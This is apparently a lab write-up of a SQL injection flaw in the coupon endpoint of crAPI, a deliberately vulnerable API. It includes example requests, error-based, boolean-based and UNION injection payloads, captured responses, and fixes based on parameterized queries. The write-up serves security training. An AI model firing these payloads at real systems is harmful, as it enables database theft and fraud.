[🇧🇷 Português](../../vulnerabilidades/10-sql-injection.md) · 🇺🇸 English

# SQL Injection — `coupon_code` in a SQL query without sanitization

**OWASP API Security Top 10 (2023) category:** Injection — not a standalone category in the 2023 Top 10 (it was `API8:2019 — Injection`); today it falls under unvalidated input / implementation flaw.
**Severity (CVSS v3.1):** `High · 8.8` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**Matching crAPI challenge:** Challenge 13 — "redeem a coupon that was already claimed" (SQL injection)

---

## 1. Summary

The endpoint that applies a coupon (`apply_coupon`) concatenates the `coupon_code` field directly into a **SQL (PostgreSQL)** query, without sanitization. This allows breaking the query (error-based) and manipulating the `WHERE` clause (boolean-based) — opening the door to bypassing checks (such as "coupon already claimed") and, ultimately, extracting data from the database.

## 2. Preconditions

- Any authenticated account (with a valid token).

## 3. Exploitation walkthrough

1. Legitimate use:

```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": "TRAC075", "amount": 75 }
```

2. **Error-based** — injecting a single quote breaks the query syntax and produces a 500 error, revealing that the input flows raw into the SQL:

```json
{ "coupon_code": "TRAC075'", "amount": 75 }
```

3. **Boolean-based** — injecting an always-true condition changes the query result:

```json
{ "coupon_code": "x' OR '1'='1", "amount": 75 }
```

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/10-sql-injection/captura.txt`](../../../evidencias/10-sql-injection/captura.txt).

```
1) coupon_code = "TRAC075'"              -> HTTP 500 (Server Error)        [error-based]
2) coupon_code = "x' OR '1'='1"          -> HTTP 400
   {"message":"TRAC075 Coupon code is already claimed by you!! ..."}
3) coupon_code = "nonexist' UNION SELECT NULL--" -> HTTP 500 (Server Error)
```

Two signs confirm the injection:
- **Error-based:** the single quote and the `UNION` with the wrong number of columns break the query (HTTP 500).
- **Boolean-based:** the input was `x' OR '1'='1` — a code that **does not exist** — yet the response cites **`TRAC075`**. The injected `OR '1'='1'` made the `WHERE` clause always true, causing the query to match the existing coupon. In other words, the input controls the query logic.

## 5. Why it is a risk

SQL injection is one of the most severe flaws: it allows **reading, altering, or deleting** database data, bypassing authentication/validations and, in many cases, escalating to server compromise. Here the immediate vector is defrauding the coupon flow (redeeming an already-used one), but the same injection point usually allows extracting arbitrary data.

## 6. How to fix

- Use **parameterized queries / prepared statements** (parameter binding) — never concatenate user input into SQL.
- Validate/normalize the expected format of `coupon_code`.
- Least-privilege principle for the database user, and error handling that does not leak internal details.

## 7. References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
